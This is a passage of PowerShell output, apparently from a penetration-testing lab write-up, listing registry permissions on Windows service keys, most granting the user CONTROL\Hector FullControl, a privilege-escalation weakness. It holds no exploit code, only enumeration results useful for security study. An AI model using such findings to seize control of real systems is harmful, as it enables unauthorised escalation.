class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  SetValue, CreateSubKey, Delete, ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -1073676288</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhelscsi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhelscsi</span><br><span class="line">AccessToString          : BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Power Users Allow  SetValue, CreateSubKey, Delete, ReadKey</span><br><span class="line">                          BUILTIN\Power Users Allow  -1073676288</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhproxy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rhproxy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RmSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RmSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RpcEptMapper</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RpcEptMapper</span><br><span class="line">AccessToString          : NT AUTHORITY\Authenticated Users Allow  QueryValues, ReadPermissions</span><br><span class="line">                          BUILTIN\Users Allow  QueryValues, Notify</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RpcLocator</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RpcLocator</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RpcSs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RpcSs</span><br><span class="line">                          BUILTIN\Users Allow  -2147483648</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RSoPProv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\RSoPProv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rspndr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\rspndr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\s3cap</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\s3cap</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sacdrv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sacdrv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sacsvr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sacsvr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SamSs</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SamSs</span><br><span class="line">                          BUILTIN\Users Allow  ReadKey</span><br><span class="line">                          BUILTIN\Users Allow  -1610612736</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sbp2port</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sbp2port</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SCardSvr</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SCardSvr</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ScDeviceEnum</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ScDeviceEnum</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\scfilter</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\scfilter</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Schedule</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Schedule</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\scmbus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\scmbus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SCPolicySvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SCPolicySvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sdbus</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sdbus</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SDFRd</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SDFRd</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sdstor</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sdstor</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\seclogon</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\seclogon</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SecurityHealthService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SecurityHealthService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SEMgrSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SEMgrSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SENS</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SENS</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Sense</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Sense</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SensorDataService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SensorDataService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SensorService</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SensorService</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SensrSvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SensrSvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SerCx</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SerCx</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SerCx2</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SerCx2</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Serenum</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Serenum</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Serial</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Serial</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sermouse</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sermouse</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SessionEnv</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SessionEnv</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sfloppy</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\sfloppy</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SgrmAgent</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SgrmAgent</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SgrmBroker</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SgrmBroker</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SharedAccess</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SharedAccess</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ShellHWDetection</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\ShellHWDetection</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\shpamsvc</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\shpamsvc</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SiSRaid2</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SiSRaid2</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SiSRaid4</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SiSRaid4</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SmartPqi</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SmartPqi</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SmartSAMD</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SmartSAMD</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\smbdirect</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\smbdirect</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\smphost</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\smphost</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SMSvcHost 4.0.0.0</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SMSvcHost 4.0.0.0</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SNMP</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SNMP</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SNMPTRAP</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SNMPTRAP</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\spaceport</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\spaceport</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SpbCx</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\SpbCx</span><br><span class="line">                          NT AUTHORITY\Authenticated Users Allow  ReadKey</span><br><span class="line">                          CONTROL\Hector Allow  FullControl</span><br><span class="line">PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Spooler</span><br><span class="line">PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services</span><br><span class="line">Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentControlSet\services\Spooler</span><br><span class="line">                          